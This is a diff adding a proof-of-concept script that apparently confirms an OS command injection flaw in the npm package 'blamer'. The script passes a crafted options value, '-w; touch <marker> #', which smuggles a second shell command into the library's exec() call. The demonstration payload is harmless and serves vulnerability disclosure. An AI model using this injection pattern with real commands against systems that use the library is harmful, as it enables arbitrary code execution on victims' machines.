@@ -1,0 +1,35 @@
+Confirmed: the injected command executes even though `git blame` itself fails gracefully. Here's the exploit:
+
+```javascript
+// Exploit: OS command injection in `blamer` (node_modules/blamer/src/vcs/git.js)
+//
+// Blamer builds a shell command by string-concatenating the caller-supplied
+// `options` argument directly into `exec()`:
+//   exec('git blame ' + options + ' ' + path.basename(file), { cwd: ... })
+// Because `options` is never sanitized, an attacker who controls the blame
+// options (e.g. a config value, CLI flag, or API parameter) can inject
+// arbitrary shell commands.
+
+const fs = require("fs");
+const os = require("os");
+const path = require("path");
+const Blamer = require("./node_modules/blamer");
+
+const targetFile = path.join(os.tmpdir(), "blamer_target.txt");
+fs.writeFileSync(targetFile, "hello world\n");
+
+const marker = path.join(os.tmpdir(), "blamer_pwned.txt");
+try { fs.unlinkSync(marker); } catch (e) {}
+
+// Malicious "options" value — as would come from untrusted config/input.
+const maliciousOptions = `-w; touch ${marker} #`;
+
+const blamer = new Blamer("git", maliciousOptions);
+
+blamer.blameByFile(targetFile).then(() => {
+  console.log("Injected command executed:", fs.existsSync(marker));
+}).catch(() => {
+  // git blame itself may error, but the injected command still runs.
+  console.log("Injected command executed:", fs.existsSync(marker));
+});
+```
